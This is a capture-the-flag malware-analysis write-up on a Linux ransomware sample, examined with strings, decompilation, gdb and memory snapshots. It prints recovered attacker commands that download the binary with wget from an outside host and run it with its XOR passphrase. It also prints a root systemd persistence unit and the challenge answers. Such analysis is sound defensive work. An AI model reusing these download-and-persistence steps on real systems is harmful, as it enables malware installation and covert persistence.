# Lockpick3.0

### File in challenge
This taks provides us 3 files to analyze
- First is the binary/elf for the malware.
- Second is the vmem file which is the dump of the server's memory or a backup of the virtual machine.
- Third is the vmsn file: A .vmsn file in VMware is a snapshot file that stores the state of a virtual machine (VM) at a particular point in time, including the VM's memory, configuration, and potentially other aspects of its operational state

### Static Analysis
Running strings command on the binary and the snapshot, getting hashes for the malware and checking on virustotal.

```bash
md5sum ubuntu-client
a2444b61b65be96fc2e65924dee8febd  ubuntu-client
```

No detections on virustotal were found when searched for the same hash.\

Few things that we can see by running string on the main binary are as follows:
- We can see the GCC version that is being used for building the binary `GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0`.
- We can see that there are calls to api's like `upload`, `connect` etc.
- Apart from this another major string that we observe is `{"passphrase": "%s", "hostname": "%s"}`

Now checking for similar things in the snapshot file. But this file is quite large we can't just go through it line by line.\
We saw from the previous results that a passphrase is required. As per the general convention of a linux binary we usually pass arguments after the launching the binary, and that being the target it make sense to search for that string.

```bash
cat snap_res | grep ./ubuntu-client
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client xGonnaGiveIt2Ya
wget http://10.10.0.70:8000/ubuntu-client
wget http://10.10.0.70:8123/ubuntu-client
./ubuntu-client 
_=./ubuntu-client
wget http://10.10.0.70:8000/ubuntu-client
./ubuntu-client xGonnaGiveIt2Ya
./ubuntu-client 
root@ubuntu:~# ./ubuntu-client xGonnaGiveIt2Ya
[2P./ubuntu-client xGonnaGiveIt2Ya
[C./ubuntu-client xGonnaGiveIt2Yat2Ya
wget http://10.10.0.70:8000/ubuntu-client
wget http://10.10.0.70:8123/ubuntu-client
./ubuntu-client 
./ubuntu-client
./ubuntu-client xGonnaGiveIt2Ya
wget http://10.10.0.70:8123/ubuntu-client
[2P./ubuntu-client xGonnaGiveIt2Ya
```

We can see that with ubuntu-client there's an argument that is being passed.
This can be the xor string string utilized by the attacker, but for confirmation we have to analyze the code after decompilation.

### Advanced Static Analysis
Here we are going to decompile the binary and analyze the resulting pseudo code.\
After spending some time with the code, was able to obtain information on the following functions.
- XOR function definition and operation.
![xor_operation](xor_operation.png)
- A function which invokes the above xor operation multiple times. The Decryption function.\
The input data is being xored with one input string.
![xor_miltiple_times](xor_operation_multiple_times.png)
- One function from which the strings command was able to get the "passphrase and hostname".
- Function which mentions which type of files we have to encrypt.
![file_type](file_types_to_encrypt.png)
- A function which is used to configure and perform curl operation. Here we can see it uses funcitons like curl_easy_init, curl_slist_append, curl_easy_setopt etc.
![curl_operation](curl_operation.png)
- An encryption function which is using AES_256_cbc.
![encryption_mech](encryption_mech.png)

In the entry function there is an indirect call that is going to the multiple xor function. From where the arguments are being passed to that function.\
The entry function has only two inputs which can be the input string that we are providing durint the function initiation from cmd. So the string provided can be the XOR key are looking for.

The current understanding is that the attacker first uses the XOR oepration to acquire the address and then later appends the endpoints that it wants to call which we saw from the string functionality.

### Advanced Dynamic Analysis
Here we are going to debug the binary using gdb.

For launching the binary in debuger and running it I was getting one error which was `error while loading shared libraries: libcjson.so.1: cannot open shared object file: No such file or directory`. For solving this we need to install the libcjson package on our machine.\
We can do the same using the following commands.
```bash
$ sudo apt-cache search libcjson # checking if package available for installation
libcjson-dev - Ultralightweight JSON parser in ANSI C (development files)
libcjson1 - Ultralightweight JSON parser in ANSI C
$ sudo apt install libcjson1
# confirm the installation by searching for the missing file
find / -name libcjson.so.1 2>/dev/null
/usr/lib/x86_64-linux-gnu/libcjson.so.1
```
Now we can run gdb or edb for performing the analysis.\
After loading gdb the first thing was to check the functions available with us using `info functions` command.

We can see from the pseudo code part we have one function on which the curl command is being formed and then used, we can see the same function so we are going to set a breakpoint there and run till that location. Just doing that we can see the endpoint which is being used.

Info on the curl command being used.
![curl](curl.png)

Result by setting breakpoint and then run.
![gdb](url_for_connect.png)

We can get the same result from edb as well.
For running edb the command is `edb --run ./ubuntu-cleint <pass>`.
![edb_res1](edb-res-1.png)

After getting the base url we can easily answer the next question which asks us about the uploading files. We already got this information from the strings command.\
So with the base url we just add "/upload".

Final thing is getting what is the service that the attacker did for persistance mechanism and getting that service.\
There are two ways we can do this:
- first we keep the debugging on and get the results from the other decryption calls.\
We already know that there are multiple things that are going to get decrypted and then executed in the machine as that's how the malware is behaving, so if we try to look for the result from the other calls of xor function then we can get this information.
![edb_res2](edb-res-2.png)
We can see that there is a service that is being created which will be restarted after every reboot and run as root. The full command utilized is as follows.
```
[Unit]
Description=Ubuntu Running
After=network.target

[Service]
ExecStart=/usr/bin/ubuntu-run xGonnaGive2Ya
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```
- second is we analyze the vmem file using volatility.

One Question can be answered by taking other question as a hint.\
Task 6 asks for technique ID used for persistence. From Task 5 we can see that a service is being created by malware.\
From this we can just search `Mitre Attack technique user persistence linux service creation`.\
The first link that we get is [this](https://attack.mitre.org/techniques/T1543/002/).
From here we can see the technique Id is **T1543.002**

### Completed
